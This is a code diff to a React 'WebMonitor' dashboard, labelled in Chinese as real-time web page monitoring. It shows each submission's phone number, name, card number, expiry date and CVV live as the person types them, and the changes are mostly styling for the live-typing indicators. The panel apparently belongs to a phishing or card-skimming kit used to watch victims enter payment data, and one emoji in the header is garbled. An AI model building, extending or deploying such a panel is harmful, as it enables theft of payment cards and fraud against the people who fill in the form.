@@ -193,7 +193,7 @@ export function WebMonitor() {
       <div className="border-b border-border bg-white px-6 py-3">
         <div className="flex items-center justify-between">
           <div className="flex items-center gap-4">
-            <span className="text-sm text-muted-foreground">📊 神经网络ML1.15</span>
+            <span className="text-sm text-muted-foreground">��� 神经网络ML1.15</span>
             <h1 className="text-lg font-medium text-foreground">网页实时监控</h1>
             <div className="flex items-center gap-2">
               <Badge variant="outline" className="bg-green-50 text-green-600 border-green-200">
@@ -299,59 +299,69 @@ export function WebMonitor() {
                   )}
                 </div>
 
-                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[100px] transition-all duration-300 ${
+                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[100px] transition-all duration-75 ${
                   isFieldTyping(submission.id, 'phone')
-                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                     : 'border-gray-300 bg-gray-50'
                 }`}>
-                  {submission.realtimeInput?.phone || 'N/A'}
-                  {isFieldTyping(submission.id, 'phone') && (
-                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
-                  )}
+                  <span className="relative">
+                    {getFieldValue(submission.id, 'phone')}
+                    {isFieldTyping(submission.id, 'phone') && (
+                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                    )}
+                  </span>
                 </div>
 
-                <div className={`text-sm font-medium border rounded px-2 py-1 min-w-[80px] transition-all duration-300 ${
+                <div className={`text-sm font-medium border rounded px-2 py-1 min-w-[80px] transition-all duration-75 ${
                   isFieldTyping(submission.id, 'name')
-                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                     : 'border-gray-300 bg-gray-50'
                 }`}>
-                  {submission.userName}
-                  {isFieldTyping(submission.id, 'name') && (
-                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
-                  )}
+                  <span className="relative">
+                    {getFieldValue(submission.id, 'name')}
+                    {isFieldTyping(submission.id, 'name') && (
+                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                    )}
+                  </span>
                 </div>
 
-                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[140px] transition-all duration-300 ${
+                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[140px] transition-all duration-75 ${
                   isFieldTyping(submission.id, 'cardNumber')
-                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                     : 'border-gray-300 bg-gray-50'
                 }`}>
-                  {submission.realtimeInput?.cardNumber || 'N/A'}
-                  {isFieldTyping(submission.id, 'cardNumber') && (
-                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
-                  )}
+                  <span className="relative">
+                    {getFieldValue(submission.id, 'cardNumber')}
+                    {isFieldTyping(submission.id, 'cardNumber') && (
+                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                    )}
+                  </span>
                 </div>
 
-                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[60px] transition-all duration-300 ${
+                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[60px] transition-all duration-75 ${
                   isFieldTyping(submission.id, 'expiryDate')
-                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                     : 'border-gray-300 bg-gray-50'
                 }`}>
-                  {submission.realtimeInput?.expiryDate || 'N/A'}
-                  {isFieldTyping(submission.id, 'expiryDate') && (
-                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
-                  )}
+                  <span className="relative">
+                    {getFieldValue(submission.id, 'expiryDate')}
+                    {isFieldTyping(submission.id, 'expiryDate') && (
+                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                    )}
+                  </span>
                 </div>
 
-                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[50px] transition-all duration-300 ${
+                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[50px] transition-all duration-75 ${
                   isFieldTyping(submission.id, 'cvv')
-                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                     : 'border-gray-300 bg-gray-50'
                 }`}>
-                  {submission.realtimeInput?.cvv || 'N/A'}
-                  {isFieldTyping(submission.id, 'cvv') && (
-                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
-                  )}
+                  <span className="relative">
+                    {getFieldValue(submission.id, 'cvv')}
+                    {isFieldTyping(submission.id, 'cvv') && (
+                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                    )}
+                  </span>
                 </div>
               </div>
 
